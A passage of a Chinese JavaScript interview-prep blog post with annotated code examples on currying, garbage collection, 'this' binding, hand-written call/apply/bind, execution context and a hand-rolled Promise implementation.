个入参，你可以只固定 2 个入参，然后返回一个需要 8 个入参的函数</li><li>两者动机就是为了 “记住” 函数的一部分参数，实现思路就是走闭包</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 柯里化</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateName</span>(<span class="params">prefix</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">type</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">itemName</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> prefix + type + itemName;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成大卖网商品名专属函数</span></span><br><span class="line"><span class="keyword">var</span> salesName = <span class="title function_">generateName</span>(<span class="string">&quot;大卖网&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// “记住”prefix，生成大卖网母婴商品名专属函数</span></span><br><span class="line"><span class="keyword">var</span> salesBabyName = <span class="title function_">salesName</span>(<span class="string">&quot;母婴&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &quot;记住“prefix和type，生成洗菜网生鲜商品名专属函数</span></span><br><span class="line"><span class="keyword">var</span> vegFreshName = <span class="title function_">generateName</span>(<span class="string">&quot;洗菜网&quot;</span>)(<span class="string">&quot;生鲜&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出 &#x27;大卖网母婴奶瓶&#x27;</span></span><br><span class="line"><span class="title function_">salesBabyName</span>(<span class="string">&quot;奶瓶&quot;</span>);</span><br><span class="line"><span class="comment">// 输出 &#x27;洗菜网生鲜菠菜&#x27;</span></span><br><span class="line"><span class="title function_">vegFreshName</span>(<span class="string">&quot;菠菜&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 啥也不记，直接生成一个商品名</span></span><br><span class="line"><span class="keyword">var</span> itemFullName = <span class="title function_">generateName</span>(<span class="string">&quot;洗菜网&quot;</span>)(<span class="string">&quot;生鲜&quot;</span>)(<span class="string">&quot;菠菜&quot;</span>);</span><br><span class="line"><span class="comment">// 偏函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateName</span>(<span class="params">prefix</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">type, itemName</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> prefix + type + itemName;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把3个参数分两部分传入</span></span><br><span class="line"><span class="keyword">var</span> itemFullName = <span class="title function_">generateName</span>(<span class="string">&quot;大卖网&quot;</span>)(<span class="string">&quot;母婴&quot;</span>, <span class="string">&quot;奶瓶&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="二、垃圾回收机制"><a href="#二、垃圾回收机制" class="headerlink" title="二、垃圾回收机制"></a>二、垃圾回收机制</h3><ul><li>垃圾回收算法<ul><li>引用计数法（内存中的每一个值都会对应一个引用计数。当垃圾收集器感知到某个值的引用计数为 0 时，就判断它 “没用” 了，随即这块内存就会被释放)<code>引用计数法无法甄别循环引用场景下的“垃圾”！</code></li><li>标记清除法<ul><li>标记阶段：垃圾收集器会先找到根对象，在浏览器里，根对象是 Window；在 Node 里，根对象是 Global。从根对象出发，垃圾收集器会扫描所有可以通过根对象触及的变量，这些对象会被标记为“可抵达 ”。</li><li>清除阶段： 没有被标记为“可抵达” 的变量，就会被认为是不需要的变量，这波变量会被清除</li></ul></li></ul></li><li>内存泄漏成因分析<ul><li>“手滑”导致的全局变量</li><li>忘记清除的 setInterval 和 setTimeout</li><li>清除不当的 DOM</li></ul></li></ul><h3 id="三、this-指向问题-【this-指向调用它所在方法的那个对象】"><a href="#三、this-指向问题-【this-指向调用它所在方法的那个对象】" class="headerlink" title="三、this 指向问题 【this 指向调用它所在方法的那个对象】"></a>三、this 指向问题 <strong>【this 指向调用它所在方法的那个对象】</strong></h3><p><strong>说得更通俗点， 谁调的函数，this 就归谁。</strong>当调用方法没有明确对象时，this 就指向全局对象。在浏览器中，指向 window；在 Node 中，指向 Global。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明位置</span></span><br><span class="line"><span class="keyword">var</span> me = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;xiuyan&quot;</span>,</span><br><span class="line">  <span class="attr">hello</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，我是<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span>`</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> you = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&quot;xiaoming&quot;</span>,</span><br><span class="line">  <span class="attr">hello</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> targetFunc = me.<span class="property">hello</span>;</span><br><span class="line">    <span class="comment">// 没有方法调用它所以它他的this指向Window</span></span><br><span class="line">    <span class="title function_">targetFunc</span>();</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;BigBear&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用位置(只是访问了hello属性，并没有调用targetFunc方法)</span></span><br><span class="line">you.<span class="title function_">hello</span>();</span><br><span class="line"><span class="comment">// me对象调用它，所以指向me</span></span><br><span class="line">me.<span class="title function_">hello</span>();</span><br></pre></td></tr></table></figure><p><code>特殊情境下的 this 指向</code></p><ul><li>立即执行函数（IIFE）</li><li>setTimeout 中传入的函数</li><li>setInterval 中传入的函数</li></ul><p><code>箭头函数</code><strong>当我们将普通函数改写为箭头函数时，箭头函数的 this 会在书写阶段（即声明位置）就绑定到它父作用域的 this 上。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">func2</span>: <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>);</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">func3</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// func1</span></span><br><span class="line"><span class="keyword">var</span> <span class="title function_">func1</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">a</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// func2</span></span><br><span class="line"><span class="keyword">var</span> func2 = obj.<span class="property">func2</span>;</span><br><span class="line"><span class="comment">// func2 = ()=&gt; &#123;</span></span><br><span class="line"><span class="comment">//     console.log(this.a)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// func3 = function()&#123;</span></span><br><span class="line"><span class="comment">//     console.log(this.a)</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// func3</span></span><br><span class="line"><span class="keyword">var</span> func3 = obj.<span class="property">func3</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">func1</span>(); <span class="comment">// 1</span></span><br><span class="line"><span class="title function_">func2</span>(); <span class="comment">// 1</span></span><br><span class="line"><span class="title function_">func3</span>(); <span class="comment">// 1</span></span><br><span class="line">obj.<span class="title function_">func2</span>(); <span class="comment">// 1</span></span><br><span class="line">obj.<span class="title function_">func3</span>(); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h3 id="四、call、apply-和-bind，用来改变函数的-this-指向"><a href="#四、call、apply-和-bind，用来改变函数的-this-指向" class="headerlink" title="四、call、apply 和 bind，用来改变函数的 this 指向"></a>四、call、apply 和 bind，用来改变函数的 this 指向</h3><ul><li><p>call、apply 和 bind 之间的区别比较大，前者在改变 this 指向的同时，也会把目标函数给执行掉；后者则只负责改造 this，不作任何执行操作。</p></li><li><p>call 和 apply 之间的区别，则体现在对入参的要求上。前者只需要将目标函数的入参逐个传入即可，后者则希望入参以数组形式被传入。</p></li></ul><p><code>简易版</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">surName, b</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> <span class="subst">$&#123;surName&#125;</span>`</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myCall</span> = <span class="keyword">function</span> (<span class="params">context, ...args</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;type error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  context = context || <span class="variable language_">window</span>;</span><br><span class="line">  context.<span class="property">func</span> = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">const</span> result = context.<span class="title function_">func</span>(...args);</span><br><span class="line">  <span class="keyword">delete</span> context.<span class="property">func</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myApply</span> = <span class="keyword">function</span> (<span class="params">context, args</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;type error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  context = context || <span class="variable language_">window</span>;</span><br><span class="line">  context.<span class="property">func</span> = <span class="variable language_">this</span>;</span><br><span class="line">  context.<span class="title function_">func</span>(...args);</span><br><span class="line">  <span class="keyword">delete</span> context.<span class="property">func</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Function</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">myBind</span> = <span class="keyword">function</span> (<span class="params">context, ...args</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">this</span> !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;type error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  context = context || <span class="variable language_">window</span>;</span><br><span class="line">  that = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;</span><br><span class="line">    that.<span class="title function_">apply</span>(context, ...args);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// call有返回结果调用</span></span><br><span class="line"><span class="keyword">const</span> res = test.<span class="title function_">myCall</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;ronaldo&quot;</span> &#125;, <span class="string">&quot;messi&quot;</span>, <span class="string">&quot;xzb&quot;</span>);</span><br><span class="line">test.<span class="title function_">myCall</span>(<span class="literal">null</span>, <span class="string">&quot;哈哈哈哈&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line"><span class="comment">// 只调用没有返回结果</span></span><br><span class="line">test.<span class="title function_">myApply</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;ronaldoxzb&quot;</span> &#125;, [<span class="string">&quot;messixzb&quot;</span>, <span class="string">&quot;xzb&quot;</span>]);</span><br><span class="line"><span class="comment">// 调用myBind无返回值</span></span><br><span class="line"><span class="keyword">const</span> myBindRes = test.<span class="title function_">myBind</span>(&#123; <span class="attr">name</span>: <span class="string">&quot;ronaldoxzb&quot;</span> &#125;, <span class="string">&quot;messixzb&quot;</span>, <span class="string">&quot;xzb&quot;</span>)();</span><br></pre></td></tr></table></figure><h3 id="五、执行上下文与调用栈"><a href="#五、执行上下文与调用栈" class="headerlink" title="五、执行上下文与调用栈"></a>五、执行上下文与调用栈</h3><h4 id="上下文的创建和组成"><a href="#上下文的创建和组成" class="headerlink" title="上下文的创建和组成"></a>上下文的创建和组成</h4><p><em>全局上下文 —— 全局代码所处的环境，不在函数中的代码都在全局执行上下文中</em><br><em>函数上下文 —— 在函数调用时创建的上下文</em></p><ul><li>创建阶段 —— 执行上下文的初始化状态，此时一行代码都还没有执行，只是做了一些准备工作<ul><li>创建的时机 —— 全局上下文在进入脚本之初就被创建，而函数上下文则是在函数调用时被创建</li><li>全局上下文仅在代码刚开始被解释的时候创建一次；而函数上下文由脚本里函数调用的多少决定，理论上可以创建无数次</li></ul></li><li>执行阶段 —— 逐行执行脚本里的代码</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">&quot;xiuyan&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> tel = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getMe</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">name</span>: name,</span><br><span class="line">    <span class="attr">tel</span>: tel,</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 创建阶段</span></span><br><span class="line"><span class="comment">// Global Execution Context</span></span><br><span class="line"><span class="comment">// window : global object</span></span><br><span class="line"><span class="comment">// this: window</span></span><br><span class="line"><span class="comment">// name: undefined</span></span><br><span class="line"><span class="comment">// tel: undefined</span></span><br><span class="line"><span class="comment">// getMe: fn()</span></span><br></pre></td></tr></table></figure><h4 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h4><h3 id="六、原型编程范式-原型编程范式的核心思想就是利用实例来描述对象，用实例作为定义对象和继承的基础。"><a href="#六、原型编程范式-原型编程范式的核心思想就是利用实例来描述对象，用实例作为定义对象和继承的基础。" class="headerlink" title="六、原型编程范式 原型编程范式的核心思想就是利用实例来描述对象，用实例作为定义对象和继承的基础。"></a>六、原型编程范式 <strong>原型编程范式的核心思想就是利用实例来描述对象，用实例作为定义对象和继承的基础。</strong></h3><h3 id="八、异步编程模型与异步解决方案"><a href="#八、异步编程模型与异步解决方案" class="headerlink" title="八、异步编程模型与异步解决方案"></a>八、异步编程模型与异步解决方案</h3><ul><li>解决回调地狱问题</li><li>异步进化史 回调函数 —&gt; Promise —&gt; Generator —&gt; async/await。</li></ul><h3 id="九、Promise-考点"><a href="#九、Promise-考点" class="headerlink" title="九、Promise 考点"></a>九、Promise 考点</h3><ul><li>考察 Promise 特性（问答题）</li><li>给出一段 Promise 代码，问输出结果（这类题的关键在于搞清楚 Promise 中不同任务的执行时机）</li><li>深度考察 Promise 原理（终极版本就是让你手写一个 Promise）</li></ul><p><strong>Promise 对象是一个代理对象。它接受你传入的 executor（执行器）作为入参，允许你把异步任务的成功和失败分别绑定到对应的处理方法上去。一个 Promise 实例有三种状态：</strong></p><ul><li>pending 状态，表示进行中。这是 Promise 实例创建后的一个初始态；</li><li>fulfilled 状态，表示成功完成。这是我们在执行器中调用 resolve 后，达成的状态；</li><li>rejected 状态，表示操作失败、被拒绝。这是我们在执行器中调用 reject 后，达成的状态；<br><strong>Promise 实例的状态是可以改变的，但它只允许被改变一次。当我们的实例状态从 pending 切换为 rejected 后，就无法再扭转为 fulfilled，反之同理。当 Promise 的状态为 resolved 时，会触发其对应的 then 方法入参里的 onfulfilled 函数；当 Promise 的状态为 rejected 时，会触发其对应的 then 方法入参里的 onrejected 函数。</strong></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myPromise</span>(<span class="params">executor</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">value</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">reason</span> = <span class="literal">null</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">status</span> = <span class="string">&quot;pending&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">onResolvedQueue</span> = [];</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">onRejectedQueue</span> = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> self = <span class="variable language_">this</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">resolve</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> !== <span class="string">&quot;pending&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    self.<span class="property">value</span> = value;</span><br><span class="line">    self.<span class="property">status</span> = <span class="string">&quot;resolved&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      self.<span class="property">onResolvedQueue</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">resolved</span>) =&gt;</span> <span class="title function_">resolved</span>(self.<span class="property">value</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">reject</span>(<span class="params">reason</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (self.<span class="property">status</span> !== <span class="string">&quot;pending&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    self.<span class="property">reason</span> = reason;</span><br><span class="line">    self.<span class="property">status</span> = <span class="string">&quot;rejected&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">      self.<span class="property">onRejectedQueue</span>.<span class="title function_">forEach</span>(<span class="function">(<span class="params">rejected</span>) =&gt;</span> <span class="title function_">reject</span>(self.<span class="property">value</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">executor</span>(resolve, reject);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myPromise.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">then</span> = <span class="keyword">function</span> (<span class="params">onResolved, onRejectd</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> onResolved !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    onResolved = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> x;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> onRejectd !== <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">    onRejectd = <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="variable language_">this</span>;</span><br><span class="line">  <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&quot;resolved&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_">onResolved</span>(self.<span class="property">value</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&quot;rejected&quot;</span>) &#123;</span><br><span class="line">    <span class="title function_">onRejectd</span>(self.<span class="property">reason</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (self.<span class="property">status</span> === <span class="string">&quot;pending&quot;</span>) &#123;</span><br><span class="line">    self.<span class="property">onResolvedQueue</span>.<span class="title function_">push</span>(onResolved);</span><br><span class="line">    self.<span class="property">onRejectedQueue</span>.<span class="title function_">push</span>(onRejectd);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cutePromise = <span class="keyword">new</span> <span class="title function_">myPromise</span>(<span class="keyword">function</span> (<span class="params">resolve, reject</span>) &#123;</span><br><span class="line">  <span class="title function_">reject</span>(<span class="string">&quot;凉了！&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">cutePromise</span><br><span class="line">  .<span class="title function_">then</span>(</span><br><span class="line">    <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(value);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是第 1 个任务&quot;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是第 1 个任务&quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">  )</span><br><span class="line">  .<span class="title function_">then</span>(</span><br><span class="line">    <span class="function">(<span class="params">value</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是第 2 个任务&quot;</span>, value);</span><br><span class="line">      <span class="comment">// console.log(&#x27;我是第 2 个任务&#x27;)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;我是第 2 个任务&quot;</span>, err);</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br></pre></td></tr></table></figure><h3 id="十、-ES2015-考点"><a href="#十、-ES2015-考点" class="headerlink" title="十、 ES2015+考点"></a>十、 ES2015+考点</h3><h4 id="对象与数组的解构"><a href="#对象与数组的解构" class="headerlink" title="对象与数组的解构"></a>对象与数组的解构</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xzb = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [a, b, c] = xzb;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> school = &#123;</span><br><span class="line">  <span class="attr">classes</span>: &#123;</span><br><span class="line">    <span class="attr">stu</span>: &#123;</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&quot;Bob&quot;</span>,</span><br><span class="line">      <span class="attr">age</span>: <span class="number">24</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="attr">classes</span>: &#123;</span><br><span class="line">    <span 